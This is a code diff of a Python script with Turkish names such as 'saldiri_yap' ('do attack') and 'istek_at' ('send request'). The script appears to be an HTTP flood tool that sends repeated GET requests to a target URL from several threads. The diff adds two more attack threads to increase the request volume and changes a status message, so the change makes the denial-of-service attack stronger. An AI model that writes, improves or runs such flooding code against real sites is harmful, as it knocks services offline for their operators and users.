@@ -89,8 +89,13 @@ def saldiri_yap():
 
 	thread1 = threading.Thread(target=istek_at, args=(hedef, sayi))
 	thread2 = threading.Thread(target=istek_at, args=(hedef, sayi))
+	thread3 = threading.Thread(target=istek_at, args=(hedef, sayi))
+	thread4 = threading.Thread(target=istek_at, args=(hedef, sayi))
 	thread1.start()
 	thread2.start()
+	thread3.start()
+	thread4.start()
+
 
 def root_kontrolu_yap():
 	if os.geteuid() == 0:
@@ -106,7 +111,7 @@ def istek_at(hedef, sayi):
 		try:
 			response = requests.get(hedef, timeout=5)
 			if response.status_code == 200:
-				print(f"-----GET isteği gönderildi Code: {response.status_code}-----")
+				print(f"{x} * GET isteği gönderildi Code: {response.status_code}")
 			else:
 				print(Fore.RED + f"-----GET isteği gönderirken sorun yaşandı Code: {response.status_code}-----")
 		except:
